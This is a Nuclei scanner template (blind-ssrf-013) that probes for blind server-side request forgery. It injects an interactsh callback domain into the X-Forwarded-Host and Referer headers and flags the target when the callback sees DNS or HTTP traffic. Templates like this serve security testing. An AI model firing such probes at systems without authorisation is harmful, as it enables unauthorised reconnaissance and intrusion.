http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-Host: {{Host}}.{{Port}}.BSSRF-013.{{interactsh-url}}

    Referer: {{Scheme}}://{{Host}}.{{Port}}.BSSRF-013.{{interactsh-url}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Cache-Control: no-transform

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
  stop-at-first-match: true
id: blind-ssrf-013
info:
  author: reewardius
  name: Blind SSRF
  severity: high
  tags: ssrf
